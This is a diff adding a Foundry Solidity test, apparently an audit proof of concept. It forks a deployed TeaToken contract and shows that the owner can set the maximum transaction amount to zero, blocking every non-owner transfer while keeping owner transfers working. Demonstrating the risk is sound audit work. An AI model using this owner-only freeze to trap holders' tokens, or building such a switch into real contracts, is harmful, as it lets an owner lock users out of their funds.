@@ -1,0 +1,62 @@
+```solidity
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+// Minimal interface for TeaToken
+interface ITeaToken {
+    function owner() external view returns (address);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function setMaxTxPercent(uint256 maxTxPercent) external;
+    function _maxTxAmount() external view returns (uint256);
+}
+
+contract ExploitTest is Test {
+    // Deployed contract address
+    ITeaToken constant tea = ITeaToken(0x5e18Be2A7cE626B33C539919EAca06303f1Db568);
+    address constant alice = address(0xdead);
+    address constant bob   = address(0xbeef);
+
+    function setUp() public {
+        vm.label(address(tea), "TeaToken");
+        address owner = tea.owner();
+        vm.label(owner, "Owner");
+
+        // Transfer some tokens from owner to alice to act as a normal user
+        uint256 ownerBalance = tea.balanceOf(owner);
+        require(ownerBalance >= 1000, "Owner lacks tokens for test setup");
+        vm.prank(owner);
+        tea.transfer(alice, 1000);
+        assertEq(tea.balanceOf(alice), 1000, "Alice should receive 1000 tokens");
+    }
+
+    function testOwnerCanBlockNonOwnerTransfers() public {
+        address owner = tea.owner();
+
+        // Initially alice can transfer
+        vm.prank(alice);
+        tea.transfer(bob, 1);
+        // Bob might receive less due to fees, but it's enough that transfer succeeds
+        assertGt(tea.balanceOf(bob), 0, "Bob should have received something");
+
+        // Owner sets maxTxPercent to 0, making maxTxAmount = 0
+        vm.prank(owner);
+        tea.setMaxTxPercent(0);
+        assertEq(tea._maxTxAmount(), 0, "maxTxAmount should be 0");
+
+        // Alice tries to transfer again – must revert
+        vm.prank(alice);
+        vm.expectRevert(bytes("Transfer amount exceeds the maxTxAmount."));
+        tea.transfer(bob, 1);
+
+        // Alice's balance should not change after failed transfer
+        assertEq(tea.balanceOf(alice), 999, "Alice balance unchanged (after 1 successful transfer)");
+
+        // Owner can still transfer (exempt from the maxTxAmount check)
+        vm.prank(owner);
+        tea.transfer(alice, 100);
+        assertEq(tea.balanceOf(alice), 1099, "Owner transfer succeeded");
+    }
+}
+```
